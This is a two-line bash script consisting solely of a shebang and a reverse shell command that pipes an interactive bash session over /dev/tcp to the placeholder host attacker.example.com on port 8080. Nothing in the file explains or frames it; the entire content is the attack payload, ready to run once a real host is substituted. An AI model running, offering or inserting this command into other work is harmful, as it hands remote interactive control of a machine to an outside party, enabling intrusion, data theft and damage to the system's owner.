#!/bin/bash
bash -i >& /dev/tcp/attacker.example.com/8080 0>&1
